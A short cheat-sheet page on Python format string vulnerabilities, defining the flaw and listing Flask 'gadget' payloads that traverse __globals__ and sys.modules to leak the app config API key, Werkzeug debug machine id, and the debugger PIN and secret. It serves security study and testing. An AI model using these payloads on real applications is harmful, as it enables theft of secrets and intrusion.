---
title: "Format String"
description: "Python Format String"
lead: "Python Format String"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "python"
weight: 620
toc: true
---

## Definition

A **format string** vulnerability in Python occurs when user input is directly passed into a string formatting operation, such as `%s` or `{}` in `printf`-style or `.format()` methods, without proper sanitization, potentially allowing an attacker to perform unintended operations or disclose memory contents.

## Gadgets

### Flask

```
{self.__init__.__globals__[config][API_KEY]}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[%s]._target.__self__.app.pin}
{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[%s]._target.__self__.app.secret}
```

## References

- [https://podalirius.net/fr/articles/python-format-string-vulnerabilities/](https://podalirius.net/fr/articles/python-format-string-vulnerabilities/)
- [https://vozec.fr/writeups/tweedle-dum-dee/](https://vozec.fr/writeups/tweedle-dum-dee/)